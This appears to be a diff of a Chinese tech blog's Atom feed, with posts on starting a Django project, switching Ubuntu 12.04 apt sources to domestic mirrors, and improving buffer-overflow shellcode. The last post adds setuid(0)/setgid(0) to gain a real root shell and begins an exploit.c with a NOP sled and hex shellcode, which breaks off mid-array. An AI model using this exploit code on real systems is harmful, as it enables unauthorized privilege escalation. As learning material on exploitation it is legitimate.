+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;django-admin.py startproject mysite&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;创建Django App&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;django-admin.py startapp myapp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;实习的第一个任务就是要用Django框架重写实验室网站。Django是用python语言写的开源web开发框架(open source web framework)，它鼓励快速开发,并遵循MTV设计。它的安装相当简单。&lt;/p&gt;
+&lt;p&gt;1、从官网上下载Django源代码&lt;/p
+    
+    </summary>
+    
+      <category term="网络安全" scheme="http://blog.clarkhuang.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="Django" scheme="http://blog.clarkhuang.com/tags/Django/"/>
+    
+      <category term="Python" scheme="http://blog.clarkhuang.com/tags/Python/"/>
+    
+      <category term="Web" scheme="http://blog.clarkhuang.com/tags/Web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu 12.04 更新源列表及更新方法</title>
+    <link href="http://blog.clarkhuang.com/2012/06/23/how-to-update-sourcelist-in-ubuntu/"/>
+    <id>http://blog.clarkhuang.com/2012/06/23/how-to-update-sourcelist-in-ubuntu/</id>
+    <published>2012-06-23T13:58:30.000Z</published>
+    <updated>2016-05-22T06:02:25.000Z</updated>
+    
+    <content type="html">&lt;p&gt;Ubuntu的官方源速度太慢，可以换一个速度快的国内源。更新源列表的方法如下：&lt;/p&gt;
+&lt;p&gt;1、备份原列表&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2、修改更新源&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo emacs /etc/apt/sources.list&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;将自己的源替换原来的源，并保存。&lt;/p&gt;
+&lt;p&gt;3、更新源&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;以下是几个国内的源：&lt;/p&gt;
+&lt;p&gt;1、网易源（速度很快）&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirrors.163.com/ubuntu/ precise main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirrors.163.com/ubuntu/ precise-security main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirrors.163.com/ubuntu/ precise-updates main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirrors.163.com/ubuntu/ precise-proposed main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirrors.163.com/ubuntu/ precise-backports main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirrors.163.com/ubuntu/ precise main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirrors.163.com/ubuntu/ precise-security main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirrors.163.com/ubuntu/ precise-updates main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirrors.163.com/ubuntu/ precise-proposed main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirrors.163.com/ubuntu/ precise-backports main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2、电子科技大学&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;deb http://ubuntu.uestc.edu.cn/ubuntu/ precise main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://ubuntu.uestc.edu.cn/ubuntu/ precise-backports main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://ubuntu.uestc.edu.cn/ubuntu/ precise-proposed main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://ubuntu.uestc.edu.cn/ubuntu/ precise-security main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://ubuntu.uestc.edu.cn/ubuntu/ precise-updates main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ubuntu.uestc.edu.cn/ubuntu/ precise main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ubuntu.uestc.edu.cn/ubuntu/ precise-backports main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ubuntu.uestc.edu.cn/ubuntu/ precise-proposed main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ubuntu.uestc.edu.cn/ubuntu/ precise-security main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ubuntu.uestc.edu.cn/ubuntu/ precise-updates main restricted universe multiverse&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3、北京理工大学&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirror.bjtu.edu.cn/ubuntu/ precise main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirror.bjtu.edu.cn/ubuntu/ precise-backports main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirror.bjtu.edu.cn/ubuntu/ precise-proposed main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirror.bjtu.edu.cn/ubuntu/ precise-security main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://mirror.bjtu.edu.cn/ubuntu/ precise-updates main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirror.bjtu.edu.cn/ubuntu/ precise main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirror.bjtu.edu.cn/ubuntu/ precise-backports main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirror.bjtu.edu.cn/ubuntu/ precise-proposed main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirror.bjtu.edu.cn/ubuntu/ precise-security main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://mirror.bjtu.edu.cn/ubuntu/ precise-updates main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;4、上海交通大学&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;deb http://ftp.sjtu.edu.cn/ubuntu/ precise main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://ftp.sjtu.edu.cn/ubuntu/ precise-backports main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://ftp.sjtu.edu.cn/ubuntu/ precise-proposed main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://ftp.sjtu.edu.cn/ubuntu/ precise-security main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://ftp.sjtu.edu.cn/ubuntu/ precise-updates main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb http://ftp.sjtu.edu.cn/ubuntu-cn/ precise main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ftp.sjtu.edu.cn/ubuntu/ precise main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ftp.sjtu.edu.cn/ubuntu/ precise-backports main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ftp.sjtu.edu.cn/ubuntu/ precise-proposed main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ftp.sjtu.edu.cn/ubuntu/ precise-security main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;deb-src http://ftp.sjtu.edu.cn/ubuntu/ precise-updates main multiverse restricted universe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Ubuntu的官方源速度太慢，可以换一个速度快的国内源。更新源列表的方法如下：&lt;/p&gt;
+&lt;p&gt;1、备份原列表&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2、修改更新源&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo emacs /etc/apt/sources.list&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;将自己的源替换原来的源，并保存。&lt;/p&gt;
+&lt;p&gt;3、更新源&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+      <category term="操作系统" scheme="http://blog.clarkhuang.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="Linux" scheme="http://blog.clarkhuang.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Shellcode的改进</title>
+    <link href="http://blog.clarkhuang.com/2012/06/07/shellcode-improvement/"/>
+    <id>http://blog.clarkhuang.com/2012/06/07/shellcode-improvement/</id>
+    <published>2012-06-07T12:43:31.000Z</published>
+    <updated>2016-05-22T06:10:39.000Z</updated>
+    
+    <content type="html">&lt;p&gt;之前我提到了可以用shellcode进行缓冲区溢出漏洞的攻击，以达到获取root权限的目的。但是，之前的shellcode并不能获取真正的root权限，通过id命令可以发现shell的当前用户的uid和gid并非为&lt;code&gt;root(0)&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/shellcode-improvement/shellcode_improv_1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;我们可以在shellcode打开&lt;code&gt;/bin/sh&lt;/code&gt;前执行&lt;code&gt;setuid(0)&lt;/code&gt;和&lt;code&gt;setgid(0)&lt;/code&gt;来提升权限，之后再执行&lt;code&gt;/bin/sh&lt;/code&gt;就能使打开的shell获得真正的root权限。&lt;code&gt;setuid(0)&lt;/code&gt;和&lt;code&gt;setgid(0)&lt;/code&gt;分别调用了&lt;code&gt;0x17&lt;/code&gt;和&lt;code&gt;0x2e&lt;/code&gt;这两个系统调用。所以，我们可以通过调用&lt;code&gt;0x17&lt;/code&gt;和&lt;code&gt;0x2e&lt;/code&gt;两个系统调用来提升权限。具体代码如下：&lt;/p&gt;
+&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* exploit.c  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; RANGE 200&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; OFFSET 100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; NOP 0x90&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*改进后的shellcode代码*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; shellcode[]=&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* setuid(0) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x31\xc0&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* xor    %eax,%eax               */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x31\xdb&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* xor    %ebx,%ebx               */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x31\xc9&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* xor    %ecx,%ecx               */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\xb0\x17&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* mov    $0x17,%al               */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\xcd\x80&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* int    $0x80                   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* setgid(0) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x31\xc0&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* xor    %eax,%eax               */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x31\xdb&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* xor    %ebx,%ebx               */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x31\xc9&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* xor    %ecx,%ecx               */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\xb0\x2e&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* mov    $0x2e,%al               